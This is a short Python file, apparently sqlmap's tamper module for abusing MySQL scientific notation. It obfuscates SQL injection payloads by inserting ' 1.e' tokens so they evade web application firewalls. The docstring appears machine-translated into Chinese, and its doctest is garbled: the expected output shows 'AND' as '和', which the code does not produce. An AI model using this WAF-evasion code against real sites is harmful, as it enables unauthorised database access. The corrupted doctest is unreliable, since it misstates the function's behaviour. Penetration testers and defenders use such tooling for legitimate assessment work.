#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    "\n    滥用 MySQL 科学记数法\n\n    Requirement:\n        * MySQL\n\n    Notes:\n        * 参考号：https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\n\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\n    '1 和 ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\n    "

    if payload:
        payload = re.sub(r"[),.*^/|&]", r" 1.e\g<0>", payload)
        payload = re.sub(r"(\w+)\(", lambda match: "%s 1.e(" % match.group(1) if not re.search(r"(?i)\A(MID|CAST|FROM|COUNT)\Z", match.group(1)) else match.group(0), payload)     # 注意：MID 和 CAST 不一定有效

    return payload
